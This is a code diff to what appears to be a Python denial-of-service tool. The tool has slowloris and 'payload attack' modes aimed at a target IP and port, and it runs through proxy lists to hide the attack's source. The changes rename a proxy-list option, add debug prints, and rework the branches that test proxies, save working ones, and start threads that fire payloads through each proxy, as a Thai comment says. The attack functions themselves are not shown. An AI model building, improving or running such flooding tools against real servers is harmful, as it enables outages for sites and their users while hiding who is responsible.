@@ -93,7 +93,7 @@ Options:                            What it do:
     \Proxy
   //--proxy-ip <IP>                 Use proxy IP
   //--proxy-port <PORT>             Use proxy Port
-  //--proxy-lists <proxy_lists.txt> Use more proxys
+  //--proxy-list <proxy_list.txt>   Use more proxys
     //--check-proxy-list            Check proxy in proxy list
     """
 
@@ -638,6 +638,9 @@ if check_target(target_ip, port_target):
             t = threading.Thread(target=slowloris_attack_with_proxy, daemon=True)
         
         elif args.slowloris_attack and args.proxy_list:
+            #print("DEBUG: payload_attack:", args.payload_attack)
+            #print("DEBUG: proxy_list:", args.proxy_list)
+            #print("DEBUG: check_proxy_list:", args.check_proxy_list)
             if args.check_proxy_list:
                 proxy_list = load_proxies()
                 print(f"{styles['bright']}!>> Testing proxys in {proxy_lists} <<!{styles['reset']}")
@@ -699,15 +702,15 @@ if check_target(target_ip, port_target):
                     time.sleep(3)
 
                     exit()
+            
             else:
                 send_payload()
             
             t = threading.Thread(target=send_payload, daemon=True)
-        elif args.payload_attack and args.proxy_list:
+        if args.payload_attack and args.proxy_list:
             if args.check_proxy_list:
                 proxy_list = load_proxies()
                 print(f"{styles['bright']}!>> Testing proxys in {proxy_lists} <<!{styles['reset']}")
-                # Check all proxys in list
                 use_all_proxies(proxy_list)
                 want_to_continue()
 
@@ -720,15 +723,15 @@ if check_target(target_ip, port_target):
                 with open(file_output, "w") as f:
                     for p in good_proxies:
                         f.write(p + "\n")
-            else:
-                pass
-            # โหลด proxy list จากไฟล์
-            if args.check_proxy_list:
+
+                # โหลด proxy จากไฟล์ที่เพิ่งเซฟ
                 with open(file_output, "r") as f:
                     proxies = [line.strip() for line in f if line.strip()]
+
             else:
                 proxies = load_proxies()
 
+            # เริ่มยิง payload
             for proxy in proxies:
                 t = threading.Thread(target=send_payload, args=(proxy,))
                 t.daemon = True
